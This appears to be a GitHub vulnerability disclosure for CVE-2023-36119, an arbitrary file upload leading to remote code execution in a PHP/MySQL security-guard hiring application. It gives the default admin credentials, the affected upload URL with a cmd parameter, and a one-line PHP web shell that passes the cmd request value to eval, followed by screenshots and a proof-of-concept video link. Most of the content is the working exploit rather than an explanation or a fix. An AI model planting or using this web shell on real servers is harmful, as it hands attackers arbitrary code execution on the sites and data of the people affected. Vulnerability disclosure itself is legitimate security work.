# Online Security Guard Hiring System
+ version 1.0
+ vendors : [Online Security Guards Hiring System using PHP and MySQL](https://phpgurukul.com/online-security-guards-hiring-system-using-php-and-mysql/)
+ Software Link: https://phpgurukul.com/projects/Online-Security-Guard-Hiring-System_PHP.zip
+ Tested on: Windows 10 + XAMPP
+ Credential for admin panel :
  + Username: admin
  + Password: Test@123
+ arbitrary file upload (RCE)
+ CVE ID: CVE-2023-36119

**Affect URL**
> http://localhost/osghs/admin/images/index.php?cmd=phpinfo();

**PHP test program**
```
<?php $code = $_GET['cmd'];
eval($code); ?>
```

![image](https://github.com/Trinity-SYT-SECURITY/arbitrary-file-upload-RCE/assets/96654161/9b24fda4-4fd0-4eb5-b465-8315ef4ceba8)

![image](https://github.com/Trinity-SYT-SECURITY/arbitrary-file-upload-RCE/assets/96654161/fb4e829b-b19a-488e-abbd-f19db61a4087)

![image](https://github.com/Trinity-SYT-SECURITY/arbitrary-file-upload-RCE/assets/96654161/2e775a08-950c-46fa-adb3-42d1cd96c90f)

## POC

https://github.com/Trinity-SYT-SECURITY/arbitrary-file-upload-RCE/assets/96654161/aa1de286-20ad-422d-a564-cb2f984af26b

